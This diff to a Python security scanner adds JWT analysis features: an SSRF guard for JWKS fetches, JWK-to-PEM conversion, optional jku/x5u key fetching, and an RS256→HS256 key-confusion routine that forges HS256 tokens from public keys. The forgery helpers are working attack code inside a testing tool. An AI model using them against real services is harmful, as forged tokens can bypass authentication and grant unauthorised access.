@@ -14,9 +14,11 @@ high-entropy payload claims (possible embedded secrets).
 import base64
 import hashlib
 import hmac
+import ipaddress
 import json
 import math
 import re
+import socket
 import time
 from collections import Counter
 from urllib.parse import urlparse
@@ -189,6 +191,181 @@ def export_hashcat(tokens, path):
     return written
 
 
+def is_safe_jwt_fetch_url(url):
+    """
+    SSRF guard for optional jku/x5u/JWKS fetches: http(s) only,
+    no loopback/private/link-local/reserved/multicast targets.
+    """
+    try:
+        parsed = urlparse(url)
+    except Exception:
+        return False
+    if parsed.scheme not in ("http", "https") or not parsed.hostname:
+        return False
+    try:
+        infos = socket.getaddrinfo(parsed.hostname, None)
+    except (socket.gaierror, UnicodeError, OSError):
+        return False
+    for info in infos:
+        try:
+            ip = ipaddress.ip_address(info[4][0])
+        except ValueError:
+            return False
+        if (
+            ip.is_private
+            or ip.is_loopback
+            or ip.is_link_local
+            or ip.is_reserved
+            or ip.is_multicast
+            or ip.is_unspecified
+        ):
+            return False
+    return True
+
+
+def _der_length(n):
+    if n < 0x80:
+        return bytes([n])
+    body = n.to_bytes((n.bit_length() + 7) // 8, "big")
+    return bytes([0x80 | len(body)]) + body
+
+
+def _der_int(value):
+    length_bytes = value.to_bytes((value.bit_length() + 7) // 8 or 1, "big")
+    if length_bytes[0] & 0x80:
+        length_bytes = b"\x00" + length_bytes
+    return b"\x02" + _der_length(len(length_bytes)) + length_bytes
+
+
+def rsa_jwk_to_pem(jwk):
+    """Build a PEM SubjectPublicKeyInfo from an RSA JWK ({n, e}). Returns str or None."""
+    if not isinstance(jwk, dict) or jwk.get("kty") not in (None, "RSA"):
+        return None
+    try:
+        if "n" not in jwk or "e" not in jwk:
+            return None
+        n = int.from_bytes(_b64url_decode(jwk["n"]), "big")
+        e = int.from_bytes(_b64url_decode(jwk["e"]), "big")
+        if n <= 0 or e <= 0:
+            return None
+        pk_seq = _der_int(n) + _der_int(e)
+        pk = b"\x30" + _der_length(len(pk_seq)) + pk_seq
+        # rsaEncryption AlgorithmIdentifier
+        oid = b"\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01"
+        null = b"\x05\x00"
+        alg = b"\x30" + _der_length(len(oid) + len(null)) + oid + null
+        spki_body = alg + pk
+        spki = b"\x30" + _der_length(len(spki_body)) + spki_body
+        b64 = base64.b64encode(spki).decode("ascii")
+        lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
+        return (
+            "-----BEGIN PUBLIC KEY-----\n"
+            + "\n".join(lines)
+            + "\n-----END PUBLIC KEY-----"
+        )
+    except Exception:
+        return None
+
+
+def forge_hs256_token(header, payload, secret):
+    """Construct an HS256 compact JWT signed with `secret` (key-confusion PoC helper)."""
+    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
+    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
+    sig = hmac.new(
+        str(secret).encode("utf-8"), f"{h}.{p}".encode("ascii"), hashlib.sha256
+    ).digest()
+    return f"{h}.{p}.{_b64url_encode(sig)}"
+
+
+def try_key_confusion(decoded, key_materials):
+    """
+    RS256→HS256 key-confusion PoC: re-sign the same payload as HS256 using
+    each public-key material as the HMAC secret. Returns (forged_token, material)
+    or (None, None). Offline — proves forgeability when public key material is known.
+    """
+    if not key_materials:
+        return None, None
+    header = dict(decoded.get("header") or {})
+    if (header.get("alg") or "").upper() not in ("RS256", "RS384", "RS512"):
+        return None, None
+    header["alg"] = "HS256"
+    for drop in ("jwk", "jku", "x5u", "x5c", "crit"):
+        header.pop(drop, None)
+    payload = decoded.get("payload") or {}
+    for mat in key_materials:
+        if not mat:
+            continue
+        forged = forge_hs256_token(header, payload, mat)
+        if verify_hs_signature(forged, mat) is True:
+            return forged, mat
+    return None, None
+
+
+def collect_embedded_key_materials(header):
+    """RSA PEM candidates from an embedded jwk header (offline)."""
+    jwk = header.get("jwk") if isinstance(header, dict) else None
+    if not isinstance(jwk, dict):
+        return []
+    pem = rsa_jwk_to_pem(jwk)
+    materials = []
+    if pem:
+        materials.append(pem)
+        # Also try raw modulus bytes (some naive HMAC implementations)
+        try:
+            materials.append(_b64url_decode(jwk["n"]))
+        except Exception:
+            pass
+    return materials
+
+
+def fetch_jwks_keys(url, timeout=5.0):
+    """
+    Fetch a JWKS document (network — behind --jwt-network).
+    Returns list of PEM strings for RSA keys. SSRF-guarded; empty on any failure.
+    """
+    if not is_safe_jwt_fetch_url(url):
+        return []
+    try:
+        import requests
+        resp = requests.get(
+            url,
+            timeout=timeout,
+            headers={"User-Agent": "SurfaceSweep/1.0"},
+        )
+        resp.raise_for_status()
+        data = resp.json()
+    except Exception:
+        return []
+    keys = data.get("keys") if isinstance(data, dict) else None
+    if not isinstance(keys, list):
+        # Some endpoints return a bare JWK
+        keys = [data] if isinstance(data, dict) and data.get("kty") else []
+    materials = []
+    for jwk in keys:
+        if isinstance(jwk, dict) and jwk.get("kty") == "RSA":
+            pem = rsa_jwk_to_pem(jwk)
+            if pem:
+                materials.append(pem)
+    return materials
+
+
+def collect_jku_urls(tokens):
+    """Unique jku/x5u URLs from decoded tokens (for optional network fetch)."""
+    urls = []
+    seen = set()
+    for item in tokens or []:
+        d = decode_jwt(item.get("token", ""))
+        if d.get("error"):
+            continue
+        header = d.get("header") or {}
+        for key in ("jku", "x5u"):
+            val = header.get(key)
+            if isinstance(val, str) and val and val not in seen:
+                seen.add(val)
+                urls.append(val)
+    return urls
+
+
 def _b64url_decode(segment):
     """Decode a base64url segment (adds padding if needed)."""
     if not segment:
@@ -352,7 +529,8 @@ def build_crack_candidates(result, wordlist_path=None, target=None):
     return candidates, meta
 
 
-def analyze_jwt(token, source="unknown", candidate_secrets=None, now=None):
+def analyze_jwt(token, source="unknown", candidate_secrets=None, now=None,
+                key_materials=None):
     """
     Analyze a single JWT. Returns:
       {
@@ -361,6 +539,8 @@ def analyze_jwt(token, source="unknown", candidate_secrets=None, now=None):
         severity: max severity of findings,
         cracked_secret: str|None,
       }
+    key_materials: optional extra PEM/raw secrets for RS256→HS256 confusion PoC
+      (e.g. fetched from jku/x5u when --jwt-network is set).
     """
     now = now if now is not None else time.time()
     decoded = decode_jwt(token)
@@ -418,6 +598,32 @@ def analyze_jwt(token, source="unknown", candidate_secrets=None, now=None):
             "issue": "asymmetric_alg",
             "detail": f"{alg} asymmetric signature (public key required for verification)",
         })
+        # --- RS256→HS256 key-confusion PoC (Step 6) ---
+        materials = list(key_materials or [])
+        materials.extend(collect_embedded_key_materials(header))
+        # de-dupe, keep order
+        seen_mat = set()
+        uniq = []
+        for m in materials:
+            mid = m if isinstance(m, str) else id(m)
+            if mid not in seen_mat:
+                seen_mat.add(mid)
+                uniq.append(m)
+        forged, used = try_key_confusion(decoded, uniq)
+        if forged is not None:
+            used_desc = (
+                used if isinstance(used, str) and len(used) <= 60
+                else (f"<{type(used).__name__}, {len(used)} bytes>" if not isinstance(used, str) else used[:60] + "…")
+            )
+            findings.append({
+                "severity": "CRITICAL",
+                "issue": "rs256_hs256_confusion",
+                "detail": (
+                    "RS256→HS256 key-confusion forgery constructed offline "
+                    f"using public key material ({used_desc}) — server may accept "
+                    "if it does not pin the algorithm"
+                ),
+            })
     elif alg:
         findings.append({
             "severity": "MEDIUM",
@@ -709,7 +915,8 @@ def _jwt_summary(analyses, severity_counts, candidates_meta, exported=0):
 
 
 def analyze_result_jwts(result, verbose=True, wordlist_path=None, target=None,
-                        hashcat_path=None, export_path=None):
+                        hashcat_path=None, export_path=None, network=False,
+                        network_timeout=5.0):
     """
     Run JWT analysis over a full scan result.
     Args:
@@ -717,6 +924,9 @@ def analyze_result_jwts(result, verbose=True, wordlist_path=None, target=None,
         target: target URL — derive host-based HMAC mutations
         hashcat_path: if set, export HS* tokens in hashcat mode 16500 format
         export_path: if set, write per-token findings as NDJSON
+        network: fetch jku/x5u JWKS over the network (SSRF-guarded) for
+                 RS256→HS256 key-confusion checks (CLI: --jwt-network)
+        network_timeout: seconds for each JWKS fetch when network=True
     Returns:
       {
         "schema_version": 1,
@@ -726,8 +936,10 @@ def analyze_result_jwts(result, verbose=True, wordlist_path=None, target=None,
         "summary": {...},
         "candidate_secrets_tried": n,
         "crack_meta": {...},
-        "hashcat_exported": n,  # when hashcat_path set
-        "findings_exported": n, # when export_path set
+        "hashcat_exported": n,
+        "findings_exported": n,
+        "jku_fetches": n,          # when network=True
+        "network_key_materials": n # when network=True
       }
     """
     if verbose:
@@ -745,6 +957,22 @@ def analyze_result_jwts(result, verbose=True, wordlist_path=None, target=None,
         if verbose and hashcat_n:
             print(f"[+] Exported {hashcat_n} HS* JWT(s) for hashcat (-m 16500): {hashcat_path}")
 
+    # Optional network: fetch jku/x5u JWKS → PEM key materials for confusion PoC
+    network_materials = []
+    jku_fetches = 0
+    if network and tokens:
+        jku_urls = collect_jku_urls(tokens)
+        for u in jku_urls:
+            jku_fetches += 1
+            network_materials.extend(fetch_jwks_keys(u, timeout=network_timeout))
+        # de-dupe PEMs
+        network_materials = list(dict.fromkeys(network_materials))
+        if verbose and jku_urls:
+            print(f"[*] Network JWKS: {jku_fetches} jku/x5u URL(s), "
+                  f"{len(network_materials)} RSA key(s) retrieved")
+        if verbose and jku_urls and not network_materials:
+            print("[*] Network JWKS: no usable RSA keys (SSRF guard, fetch error, or non-RSA)")
+
     if not tokens:
         if verbose:
             print("[*] No complete JWTs found in scan results")
@@ -759,6 +987,9 @@ def analyze_result_jwts(result, verbose=True, wordlist_path=None, target=None,
         }
         if hashcat_n:
             empty["hashcat_exported"] = hashcat_n
+        if network:
+            empty["jku_fetches"] = jku_fetches
+            empty["network_key_materials"] = len(network_materials)
         if export_path:
             empty["findings_exported"] = export_jwt_findings(empty, export_path)
         return empty
@@ -769,6 +1000,7 @@ def analyze_result_jwts(result, verbose=True, wordlist_path=None, target=None,
             item["token"],
             source=item.get("source", "unknown"),
             candidate_secrets=candidates,
+            key_materials=network_materials,
         )
         analyses.append(a)
 
@@ -813,6 +1045,11 @@ def analyze_result_jwts(result, verbose=True, wordlist_path=None, target=None,
     }
     if hashcat_n:
         out["hashcat_exported"] = hashcat_n
+    if network:
+        out["jku_fetches"] = jku_fetches
+        out["network_key_materials"] = len(network_materials)
+        out["summary"]["jku_fetches"] = jku_fetches
+        out["summary"]["network_key_materials"] = len(network_materials)
     if export_path:
         out["findings_exported"] = export_jwt_findings(out, export_path)
         if verbose and out["findings_exported"]:
